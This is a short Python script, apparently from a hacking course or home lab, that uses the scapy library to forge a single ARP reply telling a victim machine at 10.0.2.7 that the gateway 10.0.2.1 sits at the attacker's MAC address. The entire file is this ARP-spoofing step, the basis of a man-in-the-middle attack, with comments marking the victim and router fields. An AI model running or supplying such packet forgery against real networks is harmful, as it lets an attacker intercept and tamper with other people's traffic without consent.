#!/usr/bin/env python

import scapy.all as scapy

# scapy.ls(scapy.ARP()) # shows scapy options for packet creation

# target(victim) ip pdst
# target(victim) mac hwdst
# Gateway(router) ip psrc
packet = scapy.ARP(op=2, pdst="10.0.2.7", hwdst="08:00:27:08:af:07", psrc="10.0.2.1")
scapy.send(packet)